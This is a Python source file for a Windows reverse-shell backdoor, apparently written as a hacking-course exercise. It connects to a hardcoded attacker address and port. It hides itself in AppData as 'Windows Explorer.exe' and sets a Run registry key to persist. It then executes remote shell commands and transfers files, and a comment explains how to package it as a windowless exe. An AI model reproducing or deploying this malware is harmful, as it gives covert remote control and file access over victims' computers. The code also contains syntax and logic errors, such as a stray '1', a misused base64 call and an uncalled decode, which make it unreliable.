#!/usr/bin/env python

# in the windows machine
# to be an exe package :   C:\....\pyinstaller.exe reverse_backdoor.py --onefile --noconsole

# socket is the library to execute the connection
import os
import socket
import subprocess
import json
import base64
import sys
import shutil


class Backdoor:
    def __init__(self, ip, port):
        # connection
        # create the socket
        self.become_persistant()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    @staticmethod
    def become_persistant():
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        shutil.copyfile(sys.executable, evil_file_location)
        # do one time at the beginning
        if not os.path.exists(evil_file_location):
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d"' +
                            evil_file_location + '"', shell=True)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + str(self.connection.recv(1024))
                return json.loads(json_data)
            except ValueError:
                continue

    @staticmethod
    def execute_system_command(command):
        # python 2 without the console : devnull = open(os.devnull, 'wb')
        # python 3 add stderr and stdin
        # add --noconsole argument when we make the command
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

    @staticmethod
    def change_working_directory_to(path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    # download
    @staticmethod
    def read_file(path):
        with open(path, "rb") as file:
            # decode utf8 .....
            return base64.b64decode(file.read())

    # upload
    @staticmethod
    def write_file(path, content):
        with open(path, "wb") as file:
            file.write(content)
            return "[+] Download successful."

    def run(self):
        # command
        # while to be permanent (not a single use)
        while True:
            command = self.reliable_receive()

            # try:
            if command[0] == "exit":
                self.connection.close()
                # sys for silence
                sys.exit()
            elif command[0] == 'cd' and len(command) > 1:
                command_result = self.change_working_directory_to(command[1])
            elif command[0] == "download":
                command_result = self.read_file(command[1].decode())
            elif command[0] == "upload":
            1    # command[1] name of the file | command[2] content of the file
                command_result = self.write_file(command[1], command[2])
            else:
                command_result = self.execute_system_command(command).decode
        # except Exception:
            #    command_result = "[-] Error during command execution"
            self.reliable_send(command_result)


# avoid the message error on the target computer (only python 2)
# try:
my_backdoor = Backdoor("10.02.2.16", 4444)
my_backdoor.run()
# except Exception:
#    sys.exit()
